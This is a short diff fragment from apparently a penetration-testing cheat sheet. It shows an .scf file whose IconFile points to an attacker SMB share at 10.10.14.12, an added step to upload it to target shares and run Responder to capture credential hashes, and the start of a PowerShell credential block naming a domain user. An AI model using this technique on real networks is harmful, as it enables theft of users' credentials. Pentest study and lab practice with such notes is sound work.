@@ -736,6 +736,8 @@ IconFile=\\10.10.14.12\share\pentestlab.ico
 [Taskbar]
 Command=ToggleDesktop
 ```
+* upload it to the target shares and run responder
+responder.py -wrf --ln -v -I tun0
 
 [ps credential]
 $username = 'CORP.local\cleark'
